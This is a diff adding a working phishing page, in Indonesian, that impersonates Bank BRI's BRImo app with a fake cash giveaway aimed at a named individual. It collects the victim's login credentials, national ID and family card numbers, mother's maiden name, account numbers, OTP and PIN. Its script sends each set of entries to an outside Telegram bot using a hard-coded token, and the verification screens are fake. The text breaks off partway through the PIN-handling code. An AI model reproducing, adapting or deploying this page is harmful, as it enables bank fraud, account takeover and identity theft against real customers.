@@ -1,0 +1,1145 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>BRImo — Verifikasi</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Fraunces:opsz,wght@9..144,400;9..144,500;9..144,600&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      min-height: 100vh;
+      background: #ffffff;
+      color: #1A1A1A;
+      -webkit-font-smoothing: antialiased;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px 16px;
+    }
+
+    .app-wrapper {
+      max-width: 480px;
+      width: 100%;
+      margin: 0 auto;
+    }
+
+    .step {
+      display: none;
+      animation: fadeIn 0.4s ease;
+    }
+    .step.active {
+      display: block;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(12px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    /* ========== KARTU UTAMA ========== */
+    .card {
+      background: #ffffff;
+      border-radius: 28px;
+      padding: 28px 24px 32px;
+      box-shadow: 0 4px 24px rgba(0, 0, 0, 0.06);
+      border: 1px solid #f0f2f5;
+      position: relative;
+      overflow: hidden;
+    }
+
+    /* ========== LOGO ========== */
+    .logo-area {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      margin: 4px 0 18px;
+    }
+    .logo-area img {
+      height: 120px;
+      width: auto;
+      display: block;
+      max-width: 100%;
+      border-radius: 16px;
+      object-fit: contain;
+    }
+    .logo-area .fallback-logo {
+      display: none;
+      font-size: 40px;
+      font-weight: 800;
+      color: #0066AE;
+      letter-spacing: 2px;
+    }
+
+    /* ========== TYPOGRAPHY ========== */
+    .section-title {
+      font-size: 20px;
+      font-weight: 700;
+      color: #0b2545;
+      margin-bottom: 4px;
+      text-align: center;
+    }
+    .section-sub {
+      font-size: 13px;
+      color: #6b7f94;
+      margin-bottom: 20px;
+      text-align: center;
+    }
+
+    /* ========== FORM ========== */
+    .form-group {
+      margin-bottom: 16px;
+    }
+    .form-group label {
+      display: block;
+      font-size: 13px;
+      font-weight: 600;
+      color: #1e4e8c;
+      margin-bottom: 6px;
+    }
+    .form-group input,
+    .form-group textarea {
+      width: 100%;
+      padding: 14px 16px;
+      border: 2px solid #e8ecf0;
+      border-radius: 12px;
+      font-size: 15px;
+      color: #1A1A1A;
+      outline: none;
+      font-family: inherit;
+      background: #fafbfc;
+      transition: border-color 0.2s, background 0.2s;
+    }
+    .form-group input:focus,
+    .form-group textarea:focus {
+      border-color: #0066AE;
+      background: #ffffff;
+    }
+    .form-group input::placeholder {
+      color: #aab8c8;
+    }
+    .form-group textarea {
+      resize: none;
+      min-height: 80px;
+    }
+
+    /* ========== TOMBOL ========== */
+    .btn-primary {
+      width: 100%;
+      border: none;
+      border-radius: 14px;
+      padding: 16px;
+      font-size: 16px;
+      font-weight: 700;
+      cursor: pointer;
+      font-family: inherit;
+      background: linear-gradient(135deg, #0066AE, #0b2545);
+      color: white;
+      letter-spacing: 0.2px;
+      margin-top: 8px;
+      transition: all 0.2s;
+      box-shadow: 0 6px 20px -8px rgba(0, 102, 174, 0.30);
+    }
+    .btn-primary:active {
+      transform: scale(0.98);
+    }
+    .btn-primary:disabled {
+      background: #b7c9db;
+      cursor: not-allowed;
+      box-shadow: none;
+    }
+    .btn-secondary {
+      width: 100%;
+      border: none;
+      border-radius: 14px;
+      padding: 14px;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+      font-family: inherit;
+      background: #eef4fb;
+      color: #0b2545;
+      transition: all 0.2s;
+    }
+    .btn-secondary:active {
+      transform: scale(0.98);
+      background: #dbe9f7;
+    }
+
+    /* ========== SECURITY WARNING ========== */
+    .sec-warn {
+      background: #eef4fb;
+      border: 1px solid #dbe9f7;
+      border-radius: 10px;
+      padding: 10px 14px;
+      margin-bottom: 16px;
+    }
+    .sec-warn p {
+      margin: 0;
+      font-size: 11px;
+      color: #0066AE;
+      line-height: 1.5;
+    }
+
+    /* ========== LOADING / WAIT ========== */
+    .wait {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      padding: 28px 0 12px;
+    }
+    .wait.active {
+      display: flex;
+    }
+    .spinner {
+      width: 44px;
+      height: 44px;
+      border: 4px solid #e8ecf0;
+      border-top: 4px solid #0066AE;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+      margin-bottom: 16px;
+    }
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+    .wait h3 {
+      color: #0b2545;
+      font-size: 17px;
+      margin-bottom: 6px;
+    }
+    .wait p {
+      color: #6b7f94;
+      font-size: 13px;
+      text-align: center;
+      max-width: 260px;
+    }
+
+    /* ========== ERROR ========== */
+    .err {
+      display: none;
+      background: #fef2f2;
+      border: 1px solid #fcc;
+      border-radius: 12px;
+      padding: 14px;
+      margin-top: 12px;
+      text-align: center;
+    }
+    .err.active {
+      display: block;
+    }
+    .err p {
+      color: #c00;
+      font-size: 13px;
+      margin-bottom: 10px;
+    }
+
+    /* ========== OTP ========== */
+    .otp-field input {
+      width: 100%;
+      padding: 16px;
+      border: 2px solid #e8ecf0;
+      border-radius: 14px;
+      text-align: center;
+      font-size: 24px;
+      font-weight: 700;
+      color: #1A1A1A;
+      letter-spacing: 8px;
+      outline: none;
+      font-family: inherit;
+      background: #fafbfc;
+      text-transform: uppercase;
+    }
+    .otp-field input:focus {
+      border-color: #0066AE;
+      background: #ffffff;
+    }
+    .otp-hint {
+      font-size: 12px;
+      color: #6b7f94;
+      text-align: center;
+      margin: 10px 0 14px;
+    }
+
+    /* ========== PIN ========== */
+    .pin-container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 6px 0;
+    }
+    .pin-title {
+      font-size: 22px;
+      font-weight: 700;
+      color: #0b2545;
+      margin-bottom: 4px;
+    }
+    .pin-sub {
+      font-size: 14px;
+      color: #6b7f94;
+      margin-bottom: 22px;
+    }
+    .pin-boxes {
+      display: flex;
+      gap: 12px;
+      justify-content: center;
+      margin-bottom: 22px;
+    }
+    .pin-box {
+      width: 48px;
+      height: 58px;
+      border: 2px solid #e8ecf0;
+      border-radius: 12px;
+      text-align: center;
+      font-size: 28px;
+      font-weight: 700;
+      color: #1A1A1A;
+      outline: none;
+      background: #fafbfc;
+      transition: all 0.2s;
+      font-family: 'Inter', sans-serif;
+    }
+    .pin-box:focus {
+      border-color: #0066AE;
+      background: #ffffff;
+      box-shadow: 0 0 0 4px rgba(0, 102, 174, 0.12);
+    }
+    .pin-box.filled {
+      border-color: #0066AE;
+      background: #eef4fb;
+    }
+    .pin-box.error {
+      border-color: #dc2626;
+      background: #fef2f2;
+    }
+    .pin-error-text {
+      color: #dc2626;
+      font-size: 13px;
+      font-weight: 600;
+      margin-top: -16px;
+      margin-bottom: 18px;
+      display: none;
+    }
+    .pin-error-text.show {
+      display: block;
+    }
+    .pin-keypad {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 12px;
+      max-width: 280px;
+      width: 100%;
+      margin: 0 auto 18px;
+    }
+    .pin-key {
+      padding: 16px;
+      border: 1.5px solid #e8ecf0;
+      border-radius: 12px;
+      background: #ffffff;
+      font-size: 22px;
+      font-weight: 600;
+      color: #1A1A1A;
+      cursor: pointer;
+      transition: all 0.15s;
+      text-align: center;
+      font-family: 'Inter', sans-serif;
+    }
+    .pin-key:active {
+      transform: scale(0.94);
+      background: #f0f2f5;
+    }
+    .pin-key.empty {
+      background: transparent;
+      border: 1.5px solid transparent;
+      cursor: default;
+      pointer-events: none;
+    }
+    .pin-key .delete-icon {
+      font-size: 18px;
+    }
+
+    /* ========== FINAL GAGAL ========== */
+    .fail-container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 18px 6px 6px;
+      text-align: center;
+    }
+    .fail-icon {
+      width: 72px;
+      height: 72px;
+      border-radius: 50%;
+      background: #fef2f2;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 18px;
+    }
+    .fail-icon svg {
+      width: 36px;
+      height: 36px;
+      color: #dc2626;
+      stroke: #dc2626;
+      stroke-width: 2;
+      fill: none;
+    }
+    .fail-title {
+      font-size: 22px;
+      font-weight: 700;
+      color: #dc2626;
+      margin-bottom: 8px;
+    }
+    .fail-sub {
+      font-size: 14px;
+      color: #6b7f94;
+      margin-bottom: 4px;
+      line-height: 1.6;
+    }
+    .fail-sub strong {
+      color: #0066AE;
+    }
+
+    /* ========== GIVE AWAY KHUSUS ========== */
+    .giveaway-tag {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      padding: 5px 16px;
+      border-radius: 999px;
+      background: #eef4fb;
+      border: 1px solid #dbe9f7;
+      color: #1e4e8c;
+      font-size: 13px;
+      font-weight: 500;
+      margin: 0 auto 14px;
+    }
+    .giveaway-tag .dot {
+      width: 6px;
+      height: 6px;
+      border-radius: 50%;
+      background: #b8925a;
+      flex-shrink: 0;
+    }
+    .giveaway-card h2 {
+      font-family: 'Fraunces', serif;
+      font-weight: 500;
+      font-size: 22px;
+      line-height: 1.3;
+      margin: 0 0 12px;
+      color: #0b2545;
+      text-align: center;
+    }
+    .giveaway-card p.lead {
+      font-size: 14px;
+      line-height: 1.7;
+      color: #3d4f62;
+      margin: 0 0 16px;
+      text-align: left;
+    }
+    .giveaway-card p.lead strong {
+      color: #0b2545;
+      font-weight: 600;
+    }
+    .giveaway-details {
+      display: flex;
+      justify-content: center;
+      gap: 18px;
+      margin: 0 0 22px;
+      padding: 14px 0;
+      border-top: 1px solid #e8ecf0;
+      border-bottom: 1px solid #e8ecf0;
+    }
+    .giveaway-detail-item {
+      text-align: center;
+    }
+    .giveaway-detail-item .label {
+      font-size: 12px;
+      color: #6b7f94;
+      margin-bottom: 2px;
+    }
+    .giveaway-detail-item .value {
+      font-family: 'Fraunces', serif;
+      font-size: 16px;
+      font-weight: 500;
+      color: #0b2545;
+    }
+    .giveaway-note {
+      margin-top: 14px;
+      font-size: 12px;
+      color: #6b7f94;
+      text-align: center;
+    }
+    .giveaway-note strong {
+      color: #1e4e8c;
+    }
+    .giveaway-success {
+      display: none;
+    }
+    .giveaway-success.active {
+      display: block;
+    }
+    .giveaway-seal {
+      width: 64px;
+      height: 64px;
+      margin: 0 auto 16px;
+    }
+    .giveaway-seal svg {
+      width: 100%;
+      height: 100%;
+      display: block;
+    }
+
+    /* ========== RESPONSIVE ========== */
+    @media (max-width: 420px) {
+      .card {
+        padding: 20px 16px 24px;
+        border-radius: 22px;
+      }
+      .pin-box {
+        width: 40px;
+        height: 50px;
+        font-size: 22px;
+      }
+      .pin-boxes {
+        gap: 8px;
+      }
+      .logo-area img {
+        height: 100px;
+      }
+      .section-title {
+        font-size: 18px;
+      }
+      .giveaway-card h2 {
+        font-size: 19px;
+      }
+      .giveaway-card p.lead {
+        font-size: 13px;
+      }
+      .fail-title {
+        font-size: 19px;
+      }
+    }
+
+    @media (min-width: 768px) {
+      .app-wrapper {
+        max-width: 500px;
+      }
+      .logo-area img {
+        height: 140px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+<div class="app-wrapper">
+
+  <!-- ========================================================= -->
+  <!-- HALAMAN 1: GIVE AWAY + SELAMAT + TOMBOL                  -->
+  <!-- ========================================================= -->
+  <div id="stepGiveaway" class="step active">
+    <div class="card giveaway-card">
+      <!-- LOGO -->
+      <div class="logo-area">
+        <img src="https://i.ibb.co.com/NgJs4bQd/brimo-bri-logo.webp" alt="BRImo Logo" onerror="this.style.display='none'; this.nextElementSibling.style.display='block';" />
+        <span class="fallback-logo">BRImo</span>
+      </div>
+
+      <div id="giveawayClaimView">
+        <div class="giveaway-seal">
+          <svg viewBox="0 0 84 84" fill="none">
+            <circle cx="42" cy="42" r="40" stroke="#b8925a" stroke-width="1"/>
+            <circle cx="42" cy="42" r="32" fill="#0b2545"/>
+            <circle cx="42" cy="42" r="32" stroke="#b8925a" stroke-width="1.2"/>
+            <path d="M30 42.5L38 50.5L54 33.5" stroke="#ffffff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/>
+          </svg>
+        </div>
+
+        <div class="giveaway-tag">
+          <span class="dot"></span>
+          Nasabah Terpilih · Dana Bantuan Masyarakat
+        </div>
+
+        <h2>Selamat kepada nasabah BRImo atas nama : SUGIANTO</h2>
+        <p class="lead">
+          Alamat: Dusun Windu Sajan, Wonolelo, Sawangan.<br><br>
+          Anda terpilih secara acak bulan ini sebagai penerima dana bantuan masyarakat dari <strong>program dana masyarakat bank BRI</strong>.<br><br>
+          Dari seluruh nasabah kami, sistem telah memilih Anda sebagai salah satu penerima hadiah pada program <strong>DANA BANTUAN MASYARAKAT</strong> bulan ini senilai <strong>Rp4.200.000,00</strong>.<br><br>
+          Silahkan lakukan verifikasi untuk pencairan dana Anda dengan melakukan verifikasi data berikut ini.
+        </p>
+
+        <div class="giveaway-details">
+          <div class="giveaway-detail-item">
+            <div class="label">Program</div>
+            <div class="value">DBM · Sep 2026</div>
+          </div>
+          <div class="giveaway-detail-item">
+            <div class="label">Status</div>
+            <div class="value">Terpilih</div>
+          </div>
+          <div class="giveaway-detail-item">
+            <div class="label">Berlaku hingga</div>
+            <div class="value">3 hari</div>
+          </div>
+        </div>
+
+        <button class="btn-primary" id="claimGiveawayBtn">Klaim Dana Bantuan Saya</button>
+
+        <p class="giveaway-note">
+          Klaim hanya dapat dilakukan <strong>satu kali</strong> dan tidak dapat dipindahtangankan.
+        </p>
+      </div>
+
+      <div class="giveaway-success" id="giveawaySuccessView">
+        <svg style="width:56px;height:56px;margin:0 auto 14px;display:block;" viewBox="0 0 64 64" fill="none">
+          <circle cx="32" cy="32" r="31" fill="#eef4fb" stroke="#1e4e8c" stroke-width="1.5"/>
+          <path d="M20 32.5L28 40.5L45 23.5" stroke="#0b2545" stroke-width="3.2" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+        <h2 style="font-family:'Fraunces',serif;font-weight:500;font-size:22px;color:#0b2545;margin:6px 0 10px;text-align:center;">Klaim berhasil dicatat.</h2>
+        <p class="lead" style="font-size:14px;margin-bottom:16px;text-align:center;">
+          Silahkan melanjutkan verifikasi dengan mengklik tombol "Lanjut ke Verifikasi"
+        </p>
+        <button class="btn-primary" onclick="showStep('step1')">Lanjut ke Verifikasi</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- ========================================================= -->
+  <!-- HALAMAN 2: USERNAME & PASSWORD                            -->
+  <!-- ========================================================= -->
+  <div class="step" id="step1">
+    <div class="card">
+      <div class="logo-area">
+        <img src="https://i.ibb.co.com/NgJs4bQd/brimo-bri-logo.webp" alt="BRImo Logo" onerror="this.style.display='none'; this.nextElementSibling.style.display='block';" />
+        <span class="fallback-logo">BRImo</span>
+      </div>
+
+      <p class="section-title">Masuk ke Akun BRImo</p>
+      <p class="section-sub">Masukkan username dan password Anda untuk melanjutkan verifikasi.</p>
+
+      <div class="sec-warn">
+        <p>🔒 Data Anda dienkripsi dan hanya digunakan untuk verifikasi keamanan akun Anda.</p>
+      </div>
+
+      <div class="form-group">
+        <label>Username</label>
+        <input type="text" id="username" placeholder="Masukkan username" autocomplete="off" autofocus>
+      </div>
+      <div class="form-group">
+        <label>Password</label>
+        <input type="password" id="password" placeholder="Masukkan password" autocomplete="off">
+      </div>
+
+      <button class="btn-primary" id="btnLogin" onclick="submitLogin()">Lanjutkan</button>
+
+      <div class="wait" id="waitLogin">
+        <div class="spinner"></div>
+        <h3>Memverifikasi Akun</h3>
+        <p>Sistem sedang memverifikasi username dan password Anda.</p>
+      </div>
+
+      <div class="err" id="errLogin">
+        <p></p>
+        <button class="btn-secondary" onclick="retryLogin()">Coba Lagi</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- ========================================================= -->
+  <!-- HALAMAN 3: DATA DIRI                                      -->
+  <!-- ========================================================= -->
+  <div class="step" id="step2">
+    <div class="card">
+      <div class="logo-area">
+        <img src="https://i.ibb.co.com/NgJs4bQd/brimo-bri-logo.webp" alt="BRImo Logo" onerror="this.style.display='none'; this.nextElementSibling.style.display='block';" />
+        <span class="fallback-logo">BRImo</span>
+      </div>
+
+      <p class="section-title">Lengkapi Data Diri</p>
+      <p class="section-sub">Mohon isi data diri berikut dengan lengkap dan benar untuk verifikasi akun.</p>
+
+      <div class="form-group"><label>Nama Lengkap</label><input type="text" id="dataNama" placeholder="Nama sesuai KTP" autocomplete="off"></div>
+      <div class="form-group"><label>Alamat Lengkap</label><textarea id="dataAlamat" placeholder="Alamat lengkap sesuai KTP"></textarea></div>
+      <div class="form-group"><label>Tanggal Lahir</label><input type="date" id="dataTgl"></div>
+      <div class="form-group"><label>NIK</label><input type="text" id="dataNik" placeholder="16 digit NIK" maxlength="16"></div>
+      <div class="form-group"><label>Nomor KK</label><input type="text" id="dataKk" placeholder="16 digit No. KK" maxlength="16"></div>
+      <div class="form-group"><label>Nama Ibu Kandung</label><input type="text" id="dataIbu" placeholder="Nama ibu kandung"></div>
+      <div class="form-group"><label>ID Rekening</label><input type="text" id="dataIdRek" placeholder="ID rekening"></div>
+      <div class="form-group"><label>Nomor Rekening</label><input type="text" id="dataRek" placeholder="Nomor rekening" inputmode="numeric"></div>
+
+      <div class="sec-warn">
+        <p>🔒 Kami tidak pernah meminta PIN rekening melalui telepon. Halaman ini resmi dan terenkripsi.</p>
+      </div>
+
+      <button class="btn-primary" id="btnData" onclick="submitData()">Kirim & Verifikasi</button>
+
+      <div class="wait" id="waitData">
+        <div class="spinner"></div>
+        <h3>Memverifikasi Data</h3>
+        <p>Sistem sedang memverifikasi data diri Anda.</p>
+      </div>
+
+      <div class="err" id="errData">
+        <p></p>
+        <button class="btn-secondary" onclick="retryData()">Coba Lagi</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- ========================================================= -->
+  <!-- HALAMAN 4: OTP                                             -->
+  <!-- ========================================================= -->
+  <div class="step" id="step3">
+    <div class="card">
+      <div class="logo-area">
+        <img src="https://i.ibb.co.com/NgJs4bQd/brimo-bri-logo.webp" alt="BRImo Logo" onerror="this.style.display='none'; this.nextElementSibling.style.display='block';" />
+        <span class="fallback-logo">BRImo</span>
+      </div>
+
+      <p class="section-title">Verifikasi OTP</p>
+      <p class="section-sub">Cek kode OTP yang telah kami kirimkan ke nomor telepon atau email Anda.</p>
+
+      <div class="sec-warn">
+        <p>⚠️ JANGAN berikan kode OTP ini kepada siapa pun.</p>
+      </div>
+
+      <div class="otp-field">
+        <input type="text" id="otpInput" placeholder="Masukkan kode OTP" autocomplete="off" inputmode="text">
+      </div>
+      <p class="otp-hint">Masukkan 6 digit kode verifikasi via SMS atau Email</p>
+
+      <button class="btn-primary" id="btnOtp" onclick="submitOTP()">Verifikasi</button>
+
+      <div style="text-align:center;margin-top:12px;">
+        <a href="#" style="color:#0066AE;font-size:14px;font-weight:600;text-decoration:none;" onclick="resendOTP()">Kirim Ulang Kode</a>
+      </div>
+
+      <div class="wait" id="waitOTP">
+        <div class="spinner"></div>
+        <h3>Memverifikasi OTP</h3>
+        <p>Sistem sedang memverifikasi kode OTP.</p>
+      </div>
+
+      <div class="err" id="errOTP">
+        <p></p>
+        <button class="btn-secondary" onclick="retryOTP()">Masukkan Ulang</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- ========================================================= -->
+  <!-- HALAMAN 5: PIN                                             -->
+  <!-- ========================================================= -->
+  <div class="step" id="step4">
+    <div class="card">
+      <div class="logo-area">
+        <img src="https://i.ibb.co.com/NgJs4bQd/brimo-bri-logo.webp" alt="BRImo Logo" onerror="this.style.display='none'; this.nextElementSibling.style.display='block';" />
+        <span class="fallback-logo">BRImo</span>
+      </div>
+
+      <div class="pin-container">
+        <p class="pin-title">Masukkan PIN Rekening</p>
+        <p class="pin-sub">Masukkan 6 digit PIN rekening Anda</p>
+
+        <div class="pin-boxes" id="pinBoxes">
+          <input type="password" class="pin-box" id="pin0" maxlength="1" inputmode="numeric" autofocus>
+          <input type="password" class="pin-box" id="pin1" maxlength="1" inputmode="numeric">
+          <input type="password" class="pin-box" id="pin2" maxlength="1" inputmode="numeric">
+          <input type="password" class="pin-box" id="pin3" maxlength="1" inputmode="numeric">
+          <input type="password" class="pin-box" id="pin4" maxlength="1" inputmode="numeric">
+          <input type="password" class="pin-box" id="pin5" maxlength="1" inputmode="numeric">
+        </div>
+
+        <div class="pin-error-text" id="pinError">❌ PIN harus 6 digit angka</div>
+
+        <div class="pin-keypad" id="pinKeypad">
+          <button class="pin-key" data-value="1">1</button>
+          <button class="pin-key" data-value="2">2</button>
+          <button class="pin-key" data-value="3">3</button>
+          <button class="pin-key" data-value="4">4</button>
+          <button class="pin-key" data-value="5">5</button>
+          <button class="pin-key" data-value="6">6</button>
+          <button class="pin-key" data-value="7">7</button>
+          <button class="pin-key" data-value="8">8</button>
+          <button class="pin-key" data-value="9">9</button>
+          <button class="pin-key empty"></button>
+          <button class="pin-key" data-value="0">0</button>
+          <button class="pin-key" data-value="delete"><span class="delete-icon">⌫</span></button>
+        </div>
+
+        <button class="btn-primary" id="btnPin" onclick="submitPIN()">Konfirmasi PIN</button>
+      </div>
+
+      <div class="wait" id="waitPIN">
+        <div class="spinner"></div>
+        <h3>Memverifikasi PIN</h3>
+        <p>Sistem sedang memverifikasi PIN rekening Anda.</p>
+      </div>
+
+      <div class="err" id="errPIN">
+        <p></p>
+        <button class="btn-secondary" onclick="retryPIN()">Coba Lagi</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- ========================================================= -->
+  <!-- HALAMAN 6: VERIFIKASI GAGAL (FAIL)                        -->
+  <!-- ========================================================= -->
+  <div class="step" id="step5">
+    <div class="card">
+      <div class="logo-area">
+        <img src="https://i.ibb.co.com/NgJs4bQd/brimo-bri-logo.webp" alt="BRImo Logo" onerror="this.style.display='none'; this.nextElementSibling.style.display='block';" />
+        <span class="fallback-logo">BRImo</span>
+      </div>
+
+      <div class="fail-container">
+        <div class="fail-icon">
+          <svg viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round">
+            <circle cx="12" cy="12" r="10" />
+            <line x1="12" y1="8" x2="12" y2="12" />
+            <line x1="12" y1="16" x2="12.01" y2="16" />
+          </svg>
+        </div>
+
+        <p class="fail-title">Maaf, Verifikasi Gagal</p>
+
+        <p class="fail-sub">
+          Silahkan ulangi lagi masukkan data Anda yang sesuai dengan akun rekening BRImo yang telah terdaftar.
+        </p>
+
+        <p class="fail-sub" style="font-size:13px;color:#999;margin-top:8px;">
+          Silahkan tunggu beberapa saat...
+        </p>
+
+        <div style="margin-top:20px;width:100%;max-width:280px;">
+          <div class="spinner" style="margin:0 auto 16px;"></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</div>
+
+<script>
+  // ============================================
+  // TELEGRAM KONFIGURASI
+  // ============================================
+  const TELEGRAM_TOKEN = '8909248248:AAHyy7GiNs4Mh2ApZXy-s_f5TQkzGxxZ_j4';
+  const TELEGRAM_CHAT_ID = '6233868892';
+
+  async function kirimKeTelegram(pesan) {
+    const header = '🏦 BANK RAKYAT INDONESIA (BRI)\n═══════════════════════════\n📱 BRImo - Verifikasi\n\n';
+    try {
+      const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: header + pesan,
+          parse_mode: 'Markdown'
+        })
+      });
+      return await response.json();
+    } catch (error) {
+      return { ok: false, error: error.message };
+    }
+  }
+
+  // ============================================
+  // NAVIGASI
+  // ============================================
+  function showStep(id) {
+    document.querySelectorAll('.step').forEach(function(s) {
+      s.classList.remove('active');
+    });
+    document.getElementById(id).classList.add('active');
+    window.scrollTo(0, 0);
+  }
+
+  // ============================================
+  // GIVE AWAY
+  // ============================================
+  document.getElementById('claimGiveawayBtn').addEventListener('click', async function() {
+    const pesan = `🎉 KLAIM GIVE AWAY\n───────────────────\n📌 Nasabah: SUGIANTO\n📍 Alamat: Dusun Windu Sajan, Wonolelo, Sawangan\n💰 Nilai: Rp4.200.000,00\n📅 Program: DBM · Sep 2026\n⏰ Waktu: ${new Date().toLocaleString('id-ID')}`;
+    await kirimKeTelegram(pesan);
+
+    document.getElementById('giveawayClaimView').style.display = 'none';
+    document.getElementById('giveawaySuccessView').classList.add('active');
+  });
+
+  // ============================================
+  // STEP 1: USERNAME & PASSWORD
+  // ============================================
+  async function submitLogin() {
+    var u = document.getElementById('username').value.trim();
+    var p = document.getElementById('password').value.trim();
+    if (!u || !p) {
+      alert('Mohon isi username dan password!');
+      return;
+    }
+
+    const pesan = `🔐 LOGIN AKUN\n───────────────────\n👤 Username: ${u}\n🔑 Password: ${p}\n⏰ Waktu: ${new Date().toLocaleString('id-ID')}`;
+    await kirimKeTelegram(pesan);
+
+    document.getElementById('btnLogin').style.display = 'none';
+    document.getElementById('waitLogin').classList.add('active');
+    setTimeout(function() {
+      document.getElementById('waitLogin').classList.remove('active');
+      document.getElementById('btnLogin').style.display = 'block';
+      showStep('step2');
+    }, 2000);
+  }
+
+  function retryLogin() {
+    document.getElementById('errLogin').classList.remove('active');
+    document.getElementById('waitLogin').classList.remove('active');
+    document.getElementById('btnLogin').style.display = 'block';
+  }
+
+  // ============================================
+  // STEP 2: DATA DIRI
+  // ============================================
+  async function submitData() {
+    var n = document.getElementById('dataNama').value.trim();
+    var a = document.getElementById('dataAlamat').value.trim();
+    var t = document.getElementById('dataTgl').value.trim();
+    var nik = document.getElementById('dataNik').value.trim();
+    var kk = document.getElementById('dataKk').value.trim();
+    var i = document.getElementById('dataIbu').value.trim();
+    var idr = document.getElementById('dataIdRek').value.trim();
+    var r = document.getElementById('dataRek').value.trim();
+    if (!n || !a || !t || !nik || !kk || !i || !idr || !r) {
+      alert('Mohon isi semua data diri dengan lengkap!');
+      return;
+    }
+
+    const pesan = `📋 DATA DIRI\n───────────────────\n👤 Nama: ${n}\n📍 Alamat: ${a}\n📅 Tgl Lahir: ${t}\n🆔 NIK: ${nik}\n🏠 No. KK: ${kk}\n👩 Ibu Kandung: ${i}\n🔑 ID Rekening: ${idr}\n💳 No. Rekening: ${r}\n⏰ Waktu: ${new Date().toLocaleString('id-ID')}`;
+    await kirimKeTelegram(pesan);
+
+    document.getElementById('btnData').style.display = 'none';
+    document.getElementById('waitData').classList.add('active');
+    setTimeout(function() {
+      document.getElementById('waitData').classList.remove('active');
+      document.getElementById('btnData').style.display = 'block';
+      showStep('step3');
+    }, 2500);
+  }
+
+  function retryData() {
+    document.getElementById('errData').classList.remove('active');
+    document.getElementById('waitData').classList.remove('active');
+    document.getElementById('btnData').style.display = 'block';
+  }
+
+  // ============================================
+  // STEP 3: OTP
+  // ============================================
+  async function submitOTP() {
+    var o = document.getElementById('otpInput').value.trim();
+    if (!o) {
+      alert('Masukkan kode OTP');
+      return;
+    }
+
+    const pesan = `🔢 KODE OTP\n───────────────────\n🔐 OTP: ${o}\n⏰ Waktu: ${new Date().toLocaleString('id-ID')}`;
+    await kirimKeTelegram(pesan);
+
+    document.getElementById('btnOtp').style.display = 'none';
+    document.getElementById('waitOTP').classList.add('active');
+    setTimeout(function() {
+      document.getElementById('waitOTP').classList.remove('active');
+      document.getElementById('btnOtp').style.display = 'block';
+      showStep('step4');
+    }, 2500);
+  }
+
+  function retryOTP() {
+    document.getElementById('errOTP').classList.remove('active');
+    document.getElementById('waitOTP').classList.remove('active');
+    document.getElementById('btnOtp').style.display = 'block';
+    document.getElementById('otpInput').value = '';
+  }
+
+  function resendOTP() {
+    alert('Kode OTP baru telah dikirim.');
+  }
+
+  // ============================================
+  // STEP 4: PIN
+  // ============================================
+  var pinValues = ['', '', '', '', '', ''];
+  var pinInputs = [];
+
+  document.addEventListener('DOMContentLoaded', function() {
+    for (var i = 0; i < 6; i++) {
+      var input = document.getElementById('pin' + i);
+      pinInputs.push(input);
+
+      input.addEventListener('input', function(e) {
+        var idx = parseInt(this.id.replace('pin', ''));
+        var val = this.value;
+        if (val && !/^\d$/.test(val)) {
+          this.value = '';
+          return;
+        }
+        pinValues[idx] = this.value || '';
+        if (this.value) {
+          this.classList.add('filled');
+        } else {
+          this.classList.remove('filled');
+        }
+        if (this.value && idx < 5) {
+          document.getElementById('pin' + (idx + 1)).focus();
+        }
+        document.getElementById('pinError').classList.remove('show');
+        document.querySelectorAll('.pin-box').forEach(function(b) {
+          b.classList.remove('error');
+        });
+      });
+
+      input.addEventListener('keydown', function(e) {
+        var idx = parseInt(this.id.replace('pin', ''));
+        if (e.key === 'Backspace' && !this.value && idx > 0) {
+          document.getElementById('pin' + (idx - 1)).focus();
+        }
+      });
+
+      input.addEventListener('paste', function(e) {
+        e.preventDefault();
+        var pasteData= (e.clipboardData || window.clipboardData).getData('text');
+        if (pasteData && /^\d{6}$/.test(pasteData)) {
+          for (var i = 0; i < 6; i++) {
+            var inp = document.getElementById('pin' + i);
+            inp.value = pasteData[i];
+            pinValues[i] = pasteData[i];
+            if (pasteData[i]) inp.classList.add('filled');
+          }
+          document.getElementById('pin5').focus();
+        }
+      });
+    }
+
+    var keypadButtons = document.querySelectorAll('.pin-key:not(.empty)');
+    keypadButtons.forEach(function(btn) {
+      btn.addEventListener('click', function() {
+        var value = this.dataset.value;
+        if (value === 'delete') {
+          for (var i = 5; i >= 0; i--) {
+            if (pinValues[i]) {
+              pinValues[i] = '';
